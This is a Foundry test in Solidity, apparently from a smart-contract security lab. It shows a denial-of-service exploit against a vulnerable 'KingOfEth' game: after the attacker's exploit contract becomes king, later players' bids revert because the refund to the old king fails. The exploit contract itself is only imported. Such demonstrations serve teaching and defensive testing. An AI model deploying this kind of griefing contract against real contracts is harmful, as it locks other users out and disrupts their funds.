// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {KingOfEth,KingOfEthExploit} from "../src/DoSKingOfEth.sol";

contract KingOfEthExploitTest is Test {
    address private constant alice = address(1);
    address private constant bob = address(2);
    address private constant attacker = address(3);
    KingOfEth private kingOfEth;
    KingOfEthExploit private exploit;

    function setUp() public {
        kingOfEth = new KingOfEth();

        deal(alice, 1e18);
        vm.prank(alice);
        kingOfEth.play{value: 1e18}();

        deal(bob, 2 * 1e18);
        vm.prank(bob);
        kingOfEth.play{value: 2 * 1e18}();

        deal(attacker, 3 * 1e18);
        exploit = new KingOfEthExploit(address(kingOfEth));

        vm.label(address(kingOfEth), "KingOfEth");
        vm.label(address(exploit), "KingOfEthExploit");
    }

    function test_pwn() public {
        vm.prank(attacker);
        exploit.pwn{value: 3 * 1e18}();
        assertEq(address(kingOfEth.king()), address(exploit));

        deal(bob, 4 * 1e18);
        vm.expectRevert("failed to send ETH");
        vm.prank(bob);
        kingOfEth.play{value: 4 * 1e18}();
    }
}
